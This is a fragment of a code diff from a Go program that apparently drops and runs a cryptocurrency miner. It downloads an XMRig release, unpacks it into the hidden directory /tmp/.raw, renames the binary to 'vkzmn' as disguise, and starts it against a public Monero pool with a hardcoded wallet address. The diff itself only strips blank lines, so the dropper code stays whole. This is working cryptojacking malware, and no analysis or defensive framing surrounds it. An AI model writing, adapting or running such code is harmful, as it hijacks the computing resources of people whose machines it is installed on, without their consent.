@@ -24,17 +24,10 @@ func  down_raw() {
 
 
 fmt.Println("abaixando o xmrig  bruto")
-
-
-
 url := "--url  pool.supportxmr.com:9000"
-
 user :=  "--user  4Ary8uo817nZAjKXPtgRLf1XUVn1KXUp5WDBUrjDfctwGpirSoxKqBNRnRsgp7ha5vGxXD2u8maGMTezRzjaXrizTp2xYFy" 
-
 pass :=  "--pass kiidie"
-
 dl :=   "--donate-level 1"
-
 tls :=  "--tls"
 
 
@@ -82,10 +75,6 @@ r ,  e    :=  http.NewRequest("GET" , "https://download.xmrig.com/xmrig/6.9.0/07
 rrrr :=  exec.Command("sh"  ,  "-c" , "cd /tmp/.raw ; tar  -xf *.raw ; cd *.0 ; rm config.json ; mv xmrig vkzmn ; ./vkzmn " + config )
 
 
-
-
-
- 
 
 rrrr.Start()
 
